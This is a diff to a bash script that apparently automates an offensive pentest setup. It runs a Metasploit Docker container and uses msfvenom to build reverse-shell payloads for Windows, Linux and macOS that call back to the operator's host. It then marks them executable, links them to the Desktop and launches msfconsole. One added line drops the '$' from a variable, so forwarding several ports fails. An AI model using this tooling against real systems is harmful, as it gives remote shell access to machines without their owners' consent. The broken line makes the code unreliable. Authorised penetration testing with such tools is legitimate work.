@@ -13,8 +13,13 @@ do
 			netiface=${OPTARG}
 			hostip="$(ipconfig getifaddr $netiface)"
 			;;
-		p) 
+		p)
 			exploitport=$OPTARG
+			if [ -z $forwardports ]; then
+				forwardports=$(echo '-p ')$(echo $exploitport)$(echo ':')$(echo $exploitport)
+			else
+				forwardports=$(echo forwardports)$(echo ' -p ')$(echo $exploitport)$(echo ':')$(echo $exploitport)
+			fi
 			;;
 		u)
 			shellupgradeport=$OPTARG
@@ -32,15 +37,21 @@ do
 	esac
 done
 
+if [ -z $desktopfolder ]; then
+	desktopfolder=~/Desktop
+fi
+
 if [ -z $shellupgradeport ]; then
 	shellupgradeport=4433
 fi
 
+mkdir /tmp/msf
+
 # start bash ports forwarding and shared folders
 msf="$(docker run -d -t \
-	-p $exploitport:$exploitport \
-	-p $shellupgradeport:$shellupgradeport \
+	$forwardports -p $shellupgradeport:$shellupgradeport \
 	-v $desktopfolder:/pentest/Desktop \
+	-v /tmp/msf:/pentest/tmp \
 	pennoser/msf:latest /bin/bash)"
 
 # build basic reverse payloads for host
@@ -50,7 +61,8 @@ if [ -n "$winpay" ]; then
 		"LHOST=$hostip" \
 		"LPORT=$exploitport" \
 		-f "exe" \
-		-o "/pentest/Desktop/shell.exe"
+		-o "/pentest/tmp/shell.exe"
+	ln -s /tmp/msf/shell.exe $desktopfolder/shell.exe
 fi
 if [ -n "$linpay" ]; then
 	docker exec -ti $msf msfvenom \
@@ -58,18 +70,21 @@ if [ -n "$linpay" ]; then
 		"LHOST=$hostip" \
 		"LPORT=$exploitport" \
 		-f "elf" \
-		-o "/pentest/Desktop/shell"
+		-o "/pentest/tmp/shell"
 	docker exec -ti $msf /bin/bash \
-		-c "chmod +x /pentest/Desktop/shell"
+		-c "chmod +x /pentest/tmp/shell"
+	ln -s /tmp/msf/shell $desktopfolder/shell
+
 fi
 if [ -n "$osxpay" ]; then
 	docker exec -ti $msf msfvenom \
 		-p "osx/x86/shell_reverse_tcp" \
 		"LHOST=$hostip" \
 		"LPORT=$exploitport" -f \
-		"macho" -o "/pentest/Desktop/shell.command"
+		"macho" -o "/pentest/tmp/shell.command"
 	docker exec -ti $msf /bin/bash \
-		-c "chmod +x /pentest/Desktop/shell.command"
+		-c "chmod +x /pentest/tmp/shell.command"
+	ln -s /tmp/msf/shell.command $desktopfolder/shell.command
 fi
 
 # setup msfconsole startup
@@ -98,7 +113,7 @@ docker exec -ti $msf msf
 # cleanup
 docker container stop $msf
 docker container rm $msf
-rm $desktopfolder/shell*
+rm -rf /tmp/msf
 desktopfolder=''
 netiface=''
 hostip=''
